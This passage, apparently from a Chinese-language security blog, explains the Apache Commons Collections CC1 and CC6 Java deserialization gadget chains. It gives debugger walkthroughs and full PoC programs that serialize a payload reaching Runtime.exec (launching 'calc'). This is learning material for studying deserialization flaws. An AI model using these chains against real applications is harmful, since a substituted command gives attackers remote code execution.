class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Override.class, transformedmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加入序列化与反序列化接口来触发readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Override.class, transformedmap);<span class="comment">//////////////传入注解类和transformedmap</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调试一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321210044455.png" alt="image-20240321210044455"></p><p>发现没有进去if</p><p>首先我们需要memberType !&#x3D; null</p><p>不难发现memberValue就是传入的map(有一个键值对”bbb”,”aaa”), 在这里获取了它的键, 并将memberTypes下此键的值赋给memberType </p><p>memberType 由 memberTypes设置, memberTypes由annotationType.memberTypes()设置, 跟进annotationType</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321211135555.png" alt="image-20240321211135555"></p><p>可以看见,调试器已经标记出来了, 这里的type就是我们传入的注解类</p><p>我们传入的注解类是Override, 但是Override中并没有bbb这个属性</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321213340551.png" alt="image-20240321213340551"></p><p>因此考虑别的注解类</p><p>Target注解</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321213414486.png" alt="image-20240321213414486"></p><p>可以看见Target有一个value属性, 因此我们可以将map键名改为value</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321213644208.png" alt="image-20240321213644208"></p><p>这样就直接进入到了两个if中</p><p>但是这里还有问题,会报错</p><p>这是因为 为了避免Runtime无法序列化的问题, 我们需要从Runtime.class开始 反射获取getRuntime方法, 再获取Runtime对象, 再获取exec方法</p><p>而我们是从一个递归调用可控对象的transform方法开始的, 我们能传入的只是对象的数组, 如何将把Runtime.class放在反射链的首部又变成了一个新的问题</p><p>这里又移步至ConstantTransformer这个类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321215356371.png" alt="image-20240321215356371"></p><p>一切都是这么的巧, 这个类下有一个transform方法, 它返回传入的参数, 我们只需要实例化它, 并构造函数传参为Runtime.class, 这要Runtime.class就会被返回回来, 成为反射链子的首部</p><p>之后Runtime.class会成为下一次transform的参数(object), 从而绕过AnnotationInvocationHandler下setValue中参数不可控的问题</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330114646344.png" alt="image-20240330114646344"></p><p>最终利用代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321215644440.png" alt="image-20240321215644440"></p><p>成功执行!</p><h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>由于在java8u71大版本中AnnotationInvocationHandler.readObject被修改了，没有上述CC1的调用链,因此出现了CC6, 事实上CC6是CC1的变种, 它没有版本限制, 这里我们依旧沿用CC1的环境</p><h2 id="链子分析-1"><a href="#链子分析-1" class="headerlink" title="链子分析"></a>链子分析</h2><p>在此之前, 让我们先来回忆一下CC1的调用链</p><ol><li><p>首先 入口为AnnotationInvocationHandler的readObject, readObject下有一个setValue方法,此时setValue参数不可控</p></li><li><p>通过同名方法, 跳转到TransformedMap下的setValue方法(此方法继承自AbstractInputCheckedMapDecorator), 又调用TransformedMap下的CheckValue方法, CheckValue中调用了可控参数的transform方法</p></li><li><p>通过transform同名方法, 跳转到ChainedTransformer下的transform, 此方法递归调用了一个可控数组的transform方法,形成一个调用链, 通过将可控数组第一个元素赋值为ConstantTransformer, 调用ConstantTransformer的transform返回一个Runtime,Class作为下一次transform调用的参数, 绕过步骤1中etValue参数不可控的问题, 逐步通过InvokerTransformer调用链执行我们想要的行为</p></li></ol><p>这是我们上面分析出的CC1</p><p>再来看下ysoserial上的CC1链子</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240329211807221.png" alt="image-20240329211807221"></p><p>不同之处是ysoserial用的是LazyMap.get, 而我们使用的是TransformedMap.setValue()</p><p>再来看ysoserial上的CC6链子</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330121419699.png" alt="image-20240330121419699"></p><p>这里后半段链子实际上和ysoserial中的CC1的后半段高度相似, 不同的是CC1中调用LazyMap.get()的是AnnotationInvocationHandler, 而这里是TiedMapEntry</p><p>先来看LazyMap, 这里之前没有分析过</p><p>与TransformedMap类似, 它也有一个decorate方法来返回一个LazyMap对象, 并且使得get方法中的参数可控</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330201851832.png" alt="image-20240330201851832"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330201820196.png" alt="image-20240330201820196"></p><p>转到TiedMapEntry, 可以发现它调用了可控对象的get方法, 并且传给get的参数可控</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330190853630.png" alt="image-20240330190853630"></p><p>再看谁调用了getValue()             <em><strong>后续不需要考虑参数, 因为这里的getValue并没有接收任何参数</strong></em></p><p>往下翻就能看见就能发现, hashCode()调用了getValue</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330191238122.png" alt="image-20240330191238122"></p><p>看见hashCode,就可以想到去HashMap集合中寻找其调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330192257619.png" alt="image-20240330192257619"></p><p>继续寻找谁调用了hash, 答案是put (这里选用put是ysoserial中的链子, 后面会更改)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330195711124.png" alt="image-20240330195711124"></p><p>之后是HashSet中的readObject调用了put</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330200217088.png" alt="image-20240330200217088"></p><p>以上是ysoserial中的调用链, 实际上我们并不需要去调用HashSet中的readObject, 在URLDNS链子中, 我们调用了hashMap中的readObject, 在readObject的最后调用了hash</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330224651396.png" alt="image-20240330224651396"></p><p>跟进, 调用hashCode</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330224957275.png" alt="image-20240330224957275"></p><p>之后就是构造调用到TiedMapEntry</p><p>需要注意的是, </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330232456683.png" alt="image-20240330232456683"></p><p>想要进入这个if, 需要使map中没有key, 这个key是TiedMapEntry的第二个参数传过来的, 我们传入了一个aaa, 因此我们必须在put后将它remove掉</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       <span class="comment">// serialize(hashMap);</span></span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可是这里即使不进行序列化反序列化依旧会弹出计算器</p><p>问题就出在了hashmap.put</p><p>在我们还没进行序列化操作的时候进行了put操作,它调用hash方法, 并且传入的参数也是我们的利用代码, 自然会弹出计算器, </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330231133198.png" alt="image-20240330231133198"></p><p>因此, 我们应该避免以上情况, 我们可以先put一个无用的值进去, put结束后再通过反射将其改为我们的利用代码</p><p>转到LazyMap, 这里的factory, 也就是我们传入chainedTransformer的参数, 我们可以反射更改这个常量</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330231902285.png" alt="image-20240330231902285"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title 